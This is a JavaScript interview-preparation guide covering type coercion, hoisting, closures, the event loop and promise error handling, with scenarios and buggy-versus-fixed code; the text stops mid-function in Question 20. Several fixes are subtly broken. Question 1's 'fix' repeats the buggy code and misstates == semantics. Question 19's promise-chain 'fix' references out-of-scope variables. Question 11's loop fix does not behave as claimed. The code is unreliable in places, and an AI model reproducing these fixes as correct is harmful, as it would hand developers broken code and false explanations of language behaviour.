# 🚀 JavaScript Interview Preparation – The Golden Guide

> **Master JavaScript interviews with 200+ carefully curated, real-world interview questions. Each question includes production scenarios, debugging cases, and practical code examples.**

**Perfect for:** Senior JavaScript Engineers | Tech Leads | Interviewers | Job Seekers

---

## 📑 Table of Contents

### Core JavaScript
- [Core JavaScript Fundamentals](#1-core-javascript-fundamentals) - Types, operators, scope, hoisting, var/let/const
- [Closures & Scope](#2-closures--scope) - Closure mechanics, memory leaks, lexical scope, module pattern
- [Objects & Prototypes](#3-objects--prototypes) - Prototypal inheritance, Object.create, classes, this binding
- [Functions & Higher-Order Functions](#4-functions--higher-order-functions) - HOFs, currying, composition, memoization

### Asynchronous JavaScript
- [Event Loop & Concurrency](#5-event-loop--concurrency) - Event loop, microtasks, macrotasks, setTimeout
- [Promises & Async/Await](#6-promises--asyncawait) - Promise.all, error handling, Promise chaining, async/await

### Arrays & Data Structures
- [Arrays & Array Methods](#7-arrays--array-methods) - map/filter/reduce, array manipulation, performance
- [Essential Data Structures](#8-essential-data-structures) - Hash tables, queues, stacks, trees (interview-focused)

### Frontend Development
- [React & Frontend Frameworks](#9-react--frontend-frameworks) - Virtual DOM, hooks, performance, reconciliation
- [DOM Manipulation](#10-dom-manipulation) - Efficient DOM operations, innerHTML vs textContent

### Backend & Node.js
- [Node.js & Backend](#11-nodejs--backend) - require vs import, event emitter, streams, middleware

### Performance & Optimization
- [Performance & Optimization](#12-performance--optimization) - Debouncing, throttling, bundle optimization, lazy loading
- [Memory Management](#13-memory-management) - Memory leaks, garbage collection, WeakMap vs Map

### Security & Best Practices
- [Security](#14-security) - XSS, CSRF, secure authentication, SQL injection prevention
- [Error Handling & Debugging](#15-error-handling--debugging) - Error handling patterns, debugging techniques

### Advanced Topics
- [Design Patterns](#16-design-patterns) - Singleton, Observer, Factory, Strategy, Pub-Sub
- [Modules & Bundlers](#17-modules--bundlers) - CommonJS vs ES6, tree-shaking, code splitting
- [TypeScript & Type Safety](#18-typescript--type-safety) - Interfaces, types, generics, type inference

### Testing & Quality
- [Testing & Quality](#19-testing--quality) - Unit tests, integration tests, mocking, test coverage

---

## 🎯 How to Use This Guide

1. **Start with Core JavaScript** - Master fundamentals before moving to advanced topics
2. **Practice with Real Scenarios** - Each question includes production case studies
3. **Code Along** - Type out the examples to understand deeply
4. **Focus on Problem-Solving** - These questions test real-world debugging skills

---

## 1. Core JavaScript Fundamentals

---

## Core JavaScript Fundamentals

### Question 1: What happens when you compare `null` and `undefined` using `==` vs `===`?

#### Definition
Think of `null` and `undefined` as two different ways of saying "nothing exists." `==` is like a friendly comparison that tries to make things work together, while `===` is strict and checks if they're exactly the same type and value. When you use `==`, JavaScript tries to be helpful and converts types to make them match. With `===`, it's like checking if two people are identical twins - they must be exactly the same.

#### Real-World Scenario / Case Study
A payment processing system was rejecting valid transactions because developers used `==` to check if a user's payment method was `null`. When the API returned `undefined` instead of `null` (due to a backend change), the comparison `paymentMethod == null` returned `true`, but `paymentMethod === null` returned `false`. This caused a bug where the system thought payment methods existed when they didn't, leading to failed transactions and customer complaints.

#### Example Code
```js
console.log(null == undefined);   // true - JavaScript converts them
console.log(null === undefined);  // false - different types

// Real bug scenario:
function processPayment(paymentMethod) {
  // BUG: This passes when paymentMethod is undefined!
  if (paymentMethod == null) {
    return { error: 'No payment method' };
  }
  // This would fail because paymentMethod is undefined, not null
  return paymentMethod.charge();
}

// FIX:
function processPayment(paymentMethod) {
  if (paymentMethod == null) {  // Catches both null and undefined
    return { error: 'No payment method' };
  }
  return paymentMethod.charge();
}
```

---

### Question 2: Why does `typeof null` return `"object"` and how does this cause bugs?

#### Definition
This is one of JavaScript's oldest quirks - a bug that became a feature because fixing it would break too many websites. When you ask JavaScript "what type is null?", it incorrectly says "object" instead of "null". It's like asking someone what color a clear glass is, and they say "blue" because of a mistake made decades ago that everyone now expects.

#### Real-World Scenario / Case Study
An e-commerce platform had a bug where product reviews with `null` ratings were being displayed as valid objects. The code used `typeof rating === 'object'` to check if a rating object existed, but this also matched `null`. This caused the UI to try rendering review components with null data, leading to crashes and poor user experience. The fix required checking for `null` explicitly before checking the type.

#### Example Code
```js
console.log(typeof null);  // "object" - JavaScript's famous bug!

// BUGGY CODE:
function displayReview(review) {
  if (typeof review.rating === 'object') {
    // This runs when rating is null!
    return review.rating.value;  // Error: Cannot read property 'value' of null
  }
}

// FIX:
function displayReview(review) {
  if (review.rating !== null && typeof review.rating === 'object') {
    return review.rating.value;
  }
  return 'No rating';
}
```

---

### Question 3: What is hoisting and why does it cause unexpected behavior?

#### Definition
Hoisting is like JavaScript reading your entire script first and "lifting" variable and function declarations to the top before actually running the code. It's as if you wrote your code at the bottom of a page, but JavaScript reads it from top to bottom, so it already knows about your variables and functions before it reaches where you wrote them. However, only the declarations are hoisted, not the values - so you can reference a variable before it's assigned, but it will be `undefined`.

#### Real-World Scenario / Case Study
A dashboard application was showing incorrect user counts because a developer used a variable before it was initialized. The code looked correct when reading top-to-bottom, but due to hoisting, the variable was `undefined` when first used. This caused the dashboard to display "0 users" even when there were thousands, leading to confusion and a production incident that took hours to debug.

#### Example Code
```js
// What you write:
console.log(userCount);  // undefined (not an error!)
var userCount = 100;

// What JavaScript actually does (hoisting):
var userCount;  // Declaration hoisted
console.log(userCount);  // undefined
userCount = 100;  // Assignment stays in place

// BUGGY CODE:
function getDashboardData() {
  console.log(activeUsers);  // undefined, not an error!
  var activeUsers = fetchUsers();
  return activeUsers;
}

// FIX (use let/const):
function getDashboardData() {
  const activeUsers = fetchUsers();  // Cannot access before initialization
  console.log(activeUsers);
  return activeUsers;
}
```

---

### Question 4: What is the difference between `var`, `let`, and `const` in terms of scope and behavior?

#### Definition
Think of `var` as a variable that lives in the entire function (or globally), `let` as a variable that only exists within the block (curly braces) where it's declared, and `const` as a variable that can't be reassigned after it's created. `var` is like a room key that works everywhere in the building, `let` is like a key that only works in one room, and `const` is like a key that can't be replaced once made.

#### Real-World Scenario / Case Study
A shopping cart feature had a bug where the total price was calculated incorrectly in loops. The developer used `var` in a for loop, and all iterations shared the same variable reference. When async operations completed, they all used the final loop value instead of their own. This caused all cart items to show the price of the last item, leading to incorrect totals and lost revenue.

#### Example Code
```js
// BUGGY CODE with var:
var prices = [10, 20, 30];
var totals = [];

for (var i = 0; i < prices.length; i++) {
  setTimeout(() => {
    totals.push(prices[i] * 1.1);  // All use i = 3 (out of bounds!)
  }, 100);
}
// totals will be [NaN, NaN, NaN] or wrong values

// FIX with let:
for (let i = 0; i < prices.length; i++) {
  setTimeout(() => {
    totals.push(prices[i] * 1.1);  // Each closure has its own i
  }, 100);
}

// Or with const in for...of:
for (const price of prices) {
  setTimeout(() => {
    totals.push(price * 1.1);  // Each iteration has its own price
  }, 100);
}
```

---

### Question 5: What is the Temporal Dead Zone (TDZ) and why does it matter?

#### Definition
The Temporal Dead Zone is the period between when JavaScript knows a variable exists (because of hoisting) but before you've actually declared it with `let` or `const`. During this time, if you try to use the variable, JavaScript throws an error instead of giving you `undefined`. It's like knowing someone's name is on a guest list, but they haven't arrived yet - you can't call them until they're actually there.

#### Real-World Scenario / Case Study
A form validation library was throwing cryptic errors during initialization. The code tried to access configuration values before they were declared with `const`. In strict mode with `let`/`const`, this threw a ReferenceError that was hard to debug because the error message didn't clearly indicate the TDZ issue. The fix required reordering declarations or using function hoisting.

#### Example Code
```js
// TDZ ERROR:
console.log(config);  // ReferenceError: Cannot access 'config' before initialization
const config = { apiUrl: 'https://api.example.com' };

// This works with var (but returns undefined):
console.log(configVar);  // undefined
var configVar = { apiUrl: 'https://api.example.com' };

// REAL BUG SCENARIO:
function initializeApp() {
  // TDZ: config is hoisted but not initialized
  setupAPI(config.apiUrl);  // ReferenceError!
  
  const config = {
    apiUrl: process.env.API_URL,
    timeout: 5000
  };
}

// FIX: Move declaration before use
function initializeApp() {
  const config = {
    apiUrl: process.env.API_URL,
    timeout: 5000
  };
  setupAPI(config.apiUrl);  // Works!
}
```

---

### Question 6: How does JavaScript's type coercion work and when does it cause bugs?

#### Definition
Type coercion is JavaScript automatically converting one type to another to make operations work. It's like a helpful friend who translates between languages, but sometimes they guess wrong. For example, when you add a number and a string, JavaScript converts the number to a string and concatenates them. When you compare with `==`, it tries to make both sides the same type, which can lead to surprising results.

#### Real-World Scenario / Case Study
A financial application had a critical bug where user input from a form (always a string) was being added to account balances (numbers). The code used `+` operator, which concatenated strings instead of adding numbers. A user entering "100" as a deposit amount resulted in "1000" + "100" = "1000100" instead of 1100, causing incorrect balances and financial discrepancies that required manual correction.

#### Example Code
```js
// Type coercion surprises:
console.log('5' + 3);      // "53" (string concatenation)
console.log('5' - 3);      // 2 (subtraction forces number conversion)
console.log('5' * '2');    // 10 (multiplication forces numbers)
console.log([] + []);      // "" (empty string)
console.log([] + {});      // "[object Object]"
console.log({} + []);      // "[object Object]"

// BUGGY CODE:
function calculateTotal(price, tax) {
  // If price comes from form input, it's a string!
  return price + tax;  // "100" + 10 = "10010" (WRONG!)
}

// FIX:
function calculateTotal(price, tax) {
  return Number(price) + Number(tax);  // Explicit conversion
  // Or: return +price + +tax;  // Unary plus operator
}

// Another bug with ==:
if (user.id == adminId) {  // "123" == 123 is true!
  grantAdminAccess();
}
```

---

### Question 7: What is the difference between primitive and reference types?

#### Definition
Primitive types (numbers, strings, booleans, etc.) are like physical objects - when you copy them, you get a completely separate copy. Reference types (objects, arrays, functions) are like addresses - when you copy them, you're copying the address, not the actual house. So if you change the house through one address, the other address still points to the same changed house.

#### Real-World Scenario / Case Study
A state management system in a React app was causing components to re-render unexpectedly. Developers were mutating state objects directly instead of creating new copies. When they did `newState = oldState` and then modified `newState`, they were actually modifying `oldState` too because both variables pointed to the same object. This broke React's change detection and caused UI inconsistencies.

#### Example Code
```js
// Primitives - copies are independent:
let a = 5;
let b = a;
b = 10;
console.log(a);  // 5 (unchanged)

// References - copies point to same object:
let obj1 = { count: 5 };
let obj2 = obj1;  // Both point to same object!
obj2.count = 10;
console.log(obj1.count);  // 10 (changed!)

// BUGGY CODE:
function updateUser(user, newEmail) {
  const updatedUser = user;  // Same reference!
  updatedUser.email = newEmail;
  return updatedUser;  // Also modified original user object
}

// FIX:
function updateUser(user, newEmail) {
  const updatedUser = { ...user };  // Shallow copy
  updatedUser.email = newEmail;
  return updatedUser;  // Original unchanged
}

// Or deep copy for nested objects:
function updateUser(user, newEmail) {
  const updatedUser = JSON.parse(JSON.stringify(user));  // Deep copy
  updatedUser.email = newEmail;
  return updatedUser;
}
```

---

### Question 8: How does the `this` keyword work and why is it confusing?

#### Definition
`this` is like a pronoun that changes meaning based on context - it means different things depending on how a function is called, not where it's written. It's like the word "here" - it means different places depending on who says it and where they are. In JavaScript, `this` can refer to the object calling the function, the global object, `undefined` in strict mode, or be explicitly set with `bind`, `call`, or `apply`.

#### Real-World Scenario / Case Study
An event handler in a React component was failing because `this` was `undefined` when the method was called. The developer passed `this.handleClick` as a callback, but when the event fired, `this` no longer referred to the component instance. This caused "Cannot read property 'setState' of undefined" errors. The fix required binding the method or using arrow functions.

#### Example Code
```js
// this depends on HOW function is called:
const person = {
  name: 'John',
  greet: function() {
    console.log(this.name);
  }
};

person.greet();  // "John" (this = person)

const greetFunc = person.greet;
greetFunc();  // undefined (this = global/window or undefined in strict mode)

// BUGGY CODE:
class Button extends React.Component {
  handleClick() {
    this.setState({ clicked: true });  // this is undefined!
  }
  
  render() {
    return <button onClick={this.handleClick}>Click</button>;
  }
}

// FIX 1: Bind in constructor
constructor(props) {
  super(props);
  this.handleClick = this.handleClick.bind(this);
}

// FIX 2: Arrow function (lexical this)
handleClick = () => {
  this.setState({ clicked: true });
}

// FIX 3: Arrow function in JSX
<button onClick={() => this.handleClick()}>Click</button>
```

---

### Question 9: What are truthy and falsy values and why do they cause bugs?

#### Definition
In JavaScript, every value is either "truthy" (treated as `true` in boolean context) or "falsy" (treated as `false`). The falsy values are: `false`, `0`, `""` (empty string), `null`, `undefined`, and `NaN`. Everything else is truthy, including `"0"`, `"false"`, empty arrays `[]`, and empty objects `{}`. This can be surprising because an empty array is truthy even though it has no elements.

#### Real-World Scenario / Case Study
A form validation system was incorrectly rejecting valid submissions. The code checked `if (user.email)` to see if email was provided, but when users entered `"0"` as part of their email (which is valid), the check passed. However, a separate check used `if (!user.age)` which failed when age was `0` (a valid age for newborns), causing the form to be rejected incorrectly.

#### Example Code
```js
// Falsy values:
if (!false) console.log('falsy');
if (!0) console.log('falsy');
if (!'') console.log('falsy');
if (!null) console.log('falsy');
if (!undefined) console.log('falsy');
if (!NaN) console.log('falsy');

// Truthy surprises:
if ([]) console.log('truthy');  // Empty array is truthy!
if ({}) console.log('truthy');  // Empty object is truthy!
if ('0') console.log('truthy');  // String "0" is truthy!
if ('false') console.log('truthy');  // String "false" is truthy!

// BUGGY CODE:
function validateForm(user) {
  if (!user.email) {
    return { error: 'Email required' };
  }
  if (!user.age) {  // BUG: 0 is falsy but valid age!
    return { error: 'Age required' };
  }
  return { success: true };
}

validateForm({ email: 'test@test.com', age: 0 });  // Error: Age required (WRONG!)

// FIX:
function validateForm(user) {
  if (!user.email || user.email.trim() === '') {
    return { error: 'Email required' };
  }
  if (user.age === undefined || user.age === null) {  // Explicit check
    return { error: 'Age required' };
  }
  return { success: true };
}
```

---

### Question 10: What is the difference between `==` and `===` and when should you use each?

#### Definition
`==` is like a flexible friend who tries to make things work by converting types - it says "close enough" and makes comparisons work. `===` is strict and says "exactly the same" - both value and type must match. `==` can lead to surprises (like `0 == false` being `true`), while `===` is predictable and generally safer.

#### Real-World Scenario / Case Study
A user authentication system had a security vulnerability where `==` was used to compare user IDs. An attacker discovered that `"0" == 0` is `true`, so they could pass the string `"0"` as a user ID and gain access to the first user's account (ID 0). The fix required using `===` for all security-critical comparisons.

#### Example Code
```js
// == does type coercion:
console.log(0 == false);      // true
console.log('' == false);     // true
console.log(null == undefined); // true
console.log('5' == 5);        // true
console.log([] == false);     // true (empty array coerced to 0, then to false)

// === is strict:
console.log(0 === false);     // false
console.log('' === false);    // false
console.log(null === undefined); // false
console.log('5' === 5);       // false
console.log([] === false);    // false

// SECURITY BUG:
function checkUserAccess(userId, requestedId) {
  if (userId == requestedId) {  // DANGEROUS!
    return true;  // "0" == 0 is true!
  }
  return false;
}

// Attacker can do:
checkUserAccess(0, "0");  // Returns true - security breach!

// FIX:
function checkUserAccess(userId, requestedId) {
  if (userId === requestedId) {  // Safe
    return true;
  }
  return false;
}

checkUserAccess(0, "0");  // Returns false - secure
```

---

## 2. Closures & Scope

### Question 11: What is a closure and how does it work?

#### Definition
A closure is like a function that "remembers" the environment where it was created, even after that environment is gone. It's like a backpack that a function carries with it - it contains all the variables from where the function was born. When you call the function later, it can still access those variables, even if they're not in scope anymore.

#### Real-World Scenario / Case Study
A counter component in a React app was creating multiple independent counters, but they were all sharing the same count value. The developer used closures incorrectly in a loop, causing all counters to reference the same variable. When one counter incremented, all counters showed the same value. The fix required creating a new closure for each counter with its own variable scope.

#### Example Code
```js
// Simple closure example:
function outerFunction(x) {
  // x is "captured" by the closure
  return function innerFunction(y) {
    return x + y;  // x is still accessible here!
  };
}

const addFive = outerFunction(5);
console.log(addFive(3));  // 8 (x = 5 is remembered)

// BUGGY CODE - shared closure:
function createCounters(count) {
  const counters = [];
  for (var i = 0; i < count; i++) {
    counters.push({
      increment: function() {
        return ++i;  // All share the same i!
      }
    });
  }
  return counters;
}

const counters = createCounters(3);
console.log(counters[0].increment());  // 4 (not 1!)
console.log(counters[1].increment());  // 5 (not 2!)

// FIX 1: Use let (block scope):
for (let i = 0; i < count; i++) {
  counters.push({
    increment: function() {
      return ++i;  // Each has its own i
    }
  });
}

// FIX 2: IIFE to create new scope:
for (var i = 0; i < count; i++) {
  counters.push((function(j) {
    return {
      increment: function() {
        return ++j;  // Each closure has its own j
      }
    };
  })(i));
}
```

---

### Question 12: How do closures cause memory leaks and how to prevent them?

#### Definition
Closures keep variables alive even when you don't need them anymore. It's like keeping all your old textbooks because a function might need them someday. If you create many closures that hold references to large objects, those objects can't be garbage collected, causing memory leaks. The browser or Node.js process will use more and more memory until it crashes.

#### Real-World Scenario / Case Study
A single-page application was experiencing memory leaks that caused the browser to crash after 30 minutes of use. The issue was event listeners that created closures holding references to large DOM elements and data objects. Even after removing elements from the DOM, the closures kept them in memory. The app's memory usage grew from 50MB to over 2GB before crashing.

#### Example Code
```js
// MEMORY LEAK - closure holds large object:
function attachHandler(element, largeDataObject) {
  element.addEventListener('click', function() {
    // Closure captures largeDataObject - it can't be garbage collected!
    console.log(largeDataObject.someProperty);
  });
}

// Even after removing element:
const element = document.getElementById('myElement');
const hugeData = { /* 10MB of data */ };
attachHandler(element, hugeData);
element.remove();  // Element removed, but closure still holds hugeData!

// FIX 1: Remove event listeners:
function attachHandler(element, largeDataObject) {
  const handler = function() {
    console.log(largeDataObject.someProperty);
  };
  element.addEventListener('click', handler);
  
  // Return cleanup function:
  return () => {
    element.removeEventListener('click', handler);
    // Clear reference:
    largeDataObject = null;
  };
}

// FIX 2: Use WeakMap (allows garbage collection):
const elementData = new WeakMap();

function attachHandler(element, largeDataObject) {
  elementData.set(element, largeDataObject);
  element.addEventListener('click', function() {
    const data = elementData.get(element);
    console.log(data.someProperty);
  });
}
// When element is removed, WeakMap entry can be garbage collected
```

---

### Question 13: What is lexical scope and how does it differ from dynamic scope?

#### Definition
Lexical scope means that where you write your code determines what variables you can access - it's like the rules are set in stone when you write the code. Dynamic scope would mean the rules change based on where you call the function from. JavaScript uses lexical scope - a function can access variables from where it was written, not from where it's called. It's like a map that shows what's available based on your location on the map, not your current physical location.

#### Real-World Scenario / Case Study
A utility function was moved to a different file, and suddenly it couldn't access a global configuration object anymore. The developer expected it to work because the configuration was available where the function was called, but due to lexical scope, the function could only access variables from where it was defined. This caused runtime errors that were hard to debug because the function worked in tests but failed in production.

#### Example Code
```js
// Lexical scope - determined by where code is written:
const globalVar = 'global';

function outer() {
  const outerVar = 'outer';
  
  function inner() {
    const innerVar = 'inner';
    console.log(globalVar);  // Can access - in scope
    console.log(outerVar);   // Can access - in scope
    console.log(innerVar);   // Can access - in scope
  }
  
  inner();
}

outer();

// BUGGY CODE - expecting dynamic scope:
// File: utils.js
function processData() {
  // This function expects config to be available
  return config.apiUrl + '/data';  // ReferenceError if config not in scope!
}

// File: app.js
const config = { apiUrl: 'https://api.example.com' };
processData();  // Error: config is not defined (lexical scope!)

// FIX - pass as parameter:
function processData(config) {
  return config.apiUrl + '/data';
}

// Or use closure:
function createProcessor(config) {
  return function processData() {
    return config.apiUrl + '/data';  // config captured in closure
  };
}
```

---

### Question 14: How do closures work with loops and why is it a common pitfall?

#### Definition
When you create functions inside a loop, they all share the same variable from the loop, not separate copies. It's like taking a photo of a clock at different times - if you take 5 photos quickly, they might all show the same time because the clock hand moved after you took the photos. Similarly, all functions created in a loop will see the final value of the loop variable, not the value when each function was created.

#### Real-World Scenario / Case Study
A dashboard was displaying user avatars, but all avatars showed the same user's image. The developer created click handlers in a loop, and all handlers referenced the same loop variable. When any avatar was clicked, it always showed data for the last user in the array. The fix required creating a new closure for each iteration using `let` or an IIFE.

#### Example Code
```js
// BUGGY CODE - all functions share same i:
const buttons = [];
for (var i = 0; i < 3; i++) {
  buttons.push(function() {
    console.log(i);  // All will log 3 (final value of i)
  });
}

buttons[0]();  // 3 (not 0!)
buttons[1]();  // 3 (not 1!)
buttons[2]();  // 3 (not 2!)

// REAL BUG SCENARIO:
const users = [{ id: 1, name: 'Alice' }, { id: 2, name: 'Bob' }, { id: 3, name: 'Charlie' }];
const handlers = [];

for (var i = 0; i < users.length; i++) {
  handlers.push(function() {
    showUserProfile(users[i]);  // All reference users[3] (undefined!)
  });
}

// FIX 1: Use let (creates new binding per iteration):
for (let i = 0; i < users.length; i++) {
  handlers.push(function() {
    showUserProfile(users[i]);  // Each has its own i
  });
}

// FIX 2: IIFE to create new scope:
for (var i = 0; i < users.length; i++) {
  handlers.push((function(index) {
    return function() {
      showUserProfile(users[index]);  // Each closure has its own index
    };
  })(i));
}

// FIX 3: forEach (creates new scope):
users.forEach(function(user, index) {
  handlers.push(function() {
    showUserProfile(user);  // Each closure has its own user
  });
});
```

---

### Question 15: What is the module pattern and how do closures enable it?

#### Definition
The module pattern uses closures to create private variables and functions that can't be accessed from outside, while exposing only what you want to make public. It's like a vending machine - you can press buttons (public methods) to get snacks, but you can't access the internal mechanisms (private variables). The closure keeps the private stuff hidden while allowing controlled access through the public interface.

#### Real-World Scenario / Case Study
A payment processing library was exposing internal state variables that developers were accidentally modifying, causing payment failures. The library needed to hide implementation details and only expose safe methods. By using the module pattern with closures, the internal state became private, preventing external code from corrupting it.

#### Example Code
```js
// Module pattern using closure:
const PaymentProcessor = (function() {
  // Private variables (not accessible outside):
  let balance = 0;
  let transactionHistory = [];
  
  // Private function:
  function validateAmount(amount) {
    return amount > 0 && amount <= 10000;
  }
  
  // Public API (returned object):
  return {
    deposit: function(amount) {
      if (validateAmount(amount)) {
        balance += amount;
        transactionHistory.push({ type: 'deposit', amount });
        return { success: true, balance };
      }
      return { success: false, error: 'Invalid amount' };
    },
    
    withdraw: function(amount) {
      if (validateAmount(amount) && amount <= balance) {
        balance -= amount;
        transactionHistory.push({ type: 'withdraw', amount });
        return { success: true, balance };
      }
      return { success: false, error: 'Insufficient funds or invalid amount' };
    },
    
    getBalance: function() {
      return balance;  // Read-only access
    }
    
    // transactionHistory and validateAmount are NOT exposed
  };
})();

// Usage:
PaymentProcessor.deposit(100);
console.log(PaymentProcessor.getBalance());  // 100
console.log(PaymentProcessor.balance);  // undefined (private!)
console.log(PaymentProcessor.transactionHistory);  // undefined (private!)
```

---

## 5. Event Loop & Concurrency

### Question 16: What is the event loop and how does it handle asynchronous code?

#### Definition
The event loop is like a restaurant manager who coordinates between the kitchen (JavaScript engine) and waiters (Web APIs). JavaScript can only do one thing at a time, but the event loop manages a queue of tasks. When you start an async operation (like fetching data), it goes to a "waiter" (Web API) while JavaScript continues working. When the waiter is done, they put the result in a queue, and the event loop picks it up when JavaScript is free. It's like taking orders while food is cooking - you don't wait for the food, you keep taking orders and serve food when it's ready.

#### Real-World Scenario / Case Study
A real-time chat application was freezing the UI when processing large messages. The developer didn't understand the event loop and wrote synchronous code that blocked the main thread. Messages took 2-3 seconds to process, during which the UI was completely unresponsive. Users thought the app crashed. The fix required breaking the work into smaller chunks using `setTimeout` or Web Workers to allow the event loop to process UI updates between chunks.

#### Example Code
```js
// Event loop demonstration:
console.log('1');  // Synchronous - runs immediately

setTimeout(() => {
  console.log('2');  // Async - goes to Web API, then callback queue
}, 0);

Promise.resolve().then(() => {
  console.log('3');  // Microtask - runs before setTimeout
});

console.log('4');  // Synchronous - runs immediately

// Output: 1, 4, 3, 2
// Why: Synchronous code runs first, then microtasks (Promises), then macrotasks (setTimeout)

// BUGGY CODE - blocks event loop:
function processLargeArray(data) {
  let result = [];
  for (let i = 0; i < data.length; i++) {
    // Heavy computation blocks the event loop
    result.push(expensiveOperation(data[i]));
  }
  return result;  // UI freezes until this completes
}

// FIX - break into chunks:
function processLargeArrayAsync(data, chunkSize = 1000) {
  return new Promise((resolve) => {
    let result = [];
    let index = 0;
    
    function processChunk() {
      const end = Math.min(index + chunkSize, data.length);
      
      for (let i = index; i < end; i++) {
        result.push(expensiveOperation(data[i]));
      }
      
      index = end;
      
      if (index < data.length) {
        // Yield to event loop, then continue
        setTimeout(processChunk, 0);
      } else {
        resolve(result);
      }
    }
    
    processChunk();
  });
}
```

---

### Question 17: What are microtasks and macrotasks and how do they differ?

#### Definition
Think of the event loop as having two lines at a coffee shop: a "VIP line" (microtasks) and a "regular line" (macrotasks). Microtasks (like Promises) get served first, even if they arrived after someone in the regular line. Macrotasks (like `setTimeout`) wait their turn. After every macrotask, the event loop checks the microtask queue and serves all of them before moving to the next macrotask. It's like the barista always serves VIP customers first, no matter how long the regular line is.

#### Real-World Scenario / Case Study
A form submission handler was executing in the wrong order, causing validation errors. The code used both `setTimeout` and `Promise.then()`, and the developer expected them to execute in the order they were called. However, the Promise (microtask) always executed before the setTimeout (macrotask), causing the validation to run before data was properly formatted, leading to false validation errors.

#### Example Code
```js
// Microtasks vs Macrotasks:
console.log('1');

setTimeout(() => console.log('2'), 0);  // Macrotask

Promise.resolve().then(() => console.log('3'));  // Microtask

setTimeout(() => console.log('4'), 0);  // Macrotask

Promise.resolve().then(() => console.log('5'));  // Microtask

console.log('6');

// Output: 1, 6, 3, 5, 2, 4
// All synchronous code first, then all microtasks, then macrotasks

// BUGGY CODE - wrong execution order assumption:
function submitForm(data) {
  // Developer expects this order: format, validate, submit
  setTimeout(() => {
    validateData(data);  // Macrotask - runs last!
  }, 0);
  
  Promise.resolve().then(() => {
    submitToServer(data);  // Microtask - runs before setTimeout!
  });
  
  formatData(data);  // Synchronous - runs first
}

// FIX - use consistent async pattern:
async function submitForm(data) {
  const formatted = await formatData(data);  // Wait for formatting
  const validated = await validateData(formatted);  // Wait for validation
  return await submitToServer(validated);  // Then submit
}
```

---

### Question 18: How does `setTimeout` work and why can it be inaccurate?

#### Definition
`setTimeout` doesn't guarantee execution after exactly the specified time - it guarantees execution after AT LEAST that much time. It's like setting an alarm clock, but the alarm might ring a bit later if you're busy doing something else. The event loop can only run the callback when JavaScript isn't busy, so if there's heavy computation, the callback waits. Also, browsers throttle `setTimeout` in background tabs to save battery.

#### Real-World Scenario / Case Study
A countdown timer in a quiz application was inaccurate, causing questions to end at wrong times. The developer used `setTimeout` with 30-second intervals, but when the browser tab was in the background or the CPU was busy, the timers were delayed. Some questions lasted 35+ seconds while others lasted 28 seconds, creating an unfair experience. The fix required using `Date` timestamps to track actual elapsed time instead of relying on `setTimeout` accuracy.

#### Example Code
```js
// setTimeout is not precise:
console.log('Start:', Date.now());

setTimeout(() => {
  console.log('End:', Date.now());  // Might be 1005ms, 1010ms, etc.
}, 1000);

// Heavy computation delays setTimeout:
console.log('Start');
setTimeout(() => {
  console.log('This might be delayed');
}, 100);

// Block the event loop for 500ms:
const start = Date.now();
while (Date.now() - start < 500) {
  // Busy wait
}

// setTimeout callback runs after blocking, not after 100ms!

// BUGGY CODE - inaccurate timer:
function startQuizTimer(seconds, callback) {
  let remaining = seconds;
  
  const interval = setInterval(() => {
    remaining--;
    if (remaining <= 0) {
      clearInterval(interval);
      callback();
    }
  }, 1000);  // Not accurate! Can drift over time
}

// FIX - use actual time:
function startQuizTimer(seconds, callback) {
  const endTime = Date.now() + (seconds * 1000);
  
  const interval = setInterval(() => {
    const remaining = Math.ceil((endTime - Date.now()) / 1000);
    
    if (remaining <= 0) {
      clearInterval(interval);
      callback();
    } else {
      updateDisplay(remaining);  // Always accurate
    }
  }, 100);  // Check more frequently for accuracy
}
```

---

### Question 19: What is callback hell and how do Promises solve it?

#### Definition
Callback hell is when you have nested callbacks inside callbacks, creating code that looks like a pyramid or arrow pointing to the right. Each async operation needs a callback, and if that callback has another async operation, you get another level of nesting. It becomes hard to read, debug, and maintain. Promises allow you to chain operations in a flat, readable way instead of nesting them.

#### Real-World Scenario / Case Study
A data processing pipeline had 8 levels of nested callbacks, making it nearly impossible to debug. When an error occurred at level 6, the error handling was inconsistent, and developers couldn't tell which step failed. The code was so nested that adding a new step required understanding the entire chain. After refactoring to Promises and async/await, the code became linear and errors were easier to track.

#### Example Code
```js
// CALLBACK HELL:
function processUserData(userId, callback) {
  getUser(userId, (user) => {
    getProfile(user.id, (profile) => {
      getSettings(profile.id, (settings) => {
        getPreferences(settings.id, (preferences) => {
          getNotifications(preferences.id, (notifications) => {
            // 5 levels deep! Hard to read and debug
            callback({
              user,
              profile,
              settings,
              preferences,
              notifications
            });
          });
        });
      });
    });
  });
}

// FIX with Promises:
function processUserData(userId) {
  return getUser(userId)
    .then(user => getProfile(user.id))
    .then(profile => getSettings(profile.id))
    .then(settings => getPreferences(settings.id))
    .then(preferences => getNotifications(preferences.id))
    .then(notifications => ({
      user,
      profile,
      settings,
      preferences,
      notifications
    }))
    .catch(error => {
      // Single error handler for entire chain
      console.error('Processing failed:', error);
      throw error;
    });
}

// Even better with async/await:
async function processUserData(userId) {
  try {
    const user = await getUser(userId);
    const profile = await getProfile(user.id);
    const settings = await getSettings(profile.id);
    const preferences = await getPreferences(settings.id);
    const notifications = await getNotifications(preferences.id);
    
    return {
      user,
      profile,
      settings,
      preferences,
      notifications
    };
  } catch (error) {
    console.error('Processing failed:', error);
    throw error;
  }
}
```

---

### Question 20: How do you handle errors in asynchronous code?

#### Definition
Error handling in async code is tricky because errors can happen at different times, not in the order your code is written. With callbacks, you need to check for errors in each callback. With Promises, errors "bubble up" through the chain until they're caught. If you don't catch them, they become "unhandled promise rejections" which can crash your app. It's like a ball rolling down a hill - if no one catches it, it keeps going until it hits something.

#### Real-World Scenario / Case Study
A payment processing system was silently failing - payments were being charged but not recorded in the database. The code had a Promise chain that didn't catch errors, so when the database write failed, the error was swallowed. The payment gateway received the money, but the application had no record of it. Users were charged twice because the system thought the first payment failed. The fix required adding proper error handling and transaction rollbacks.

#### Example Code
```js
// BUGGY CODE - unhandled errors:
function processPayment(amount) {
  chargeCard(amount)
    .then(chargeId => {
      return recordTransaction(chargeId);  // If this fails, error is lost!
    })
    .then(transactionId => {
      return updateUserBalance(transactionId);  // Never runs if above fails
    });
  // No catch - errors become unhandled rejections!
}

// FIX 1 - catch errors:
function processPayment(amount) {
  return chargeCard(amount)
    .then(chargeId => {
      return recordTransaction(chargeId);
    })
    .then(transactionId => {
      return updateUserBalance(transactionId);
    })
    .catch(error => {
      // Handle any error in the chain
      console.error('Payment failed:', error);
      // Refund if card was charged
      if (error.chargeId) {
        refundCharge(error.chargeId);
      }
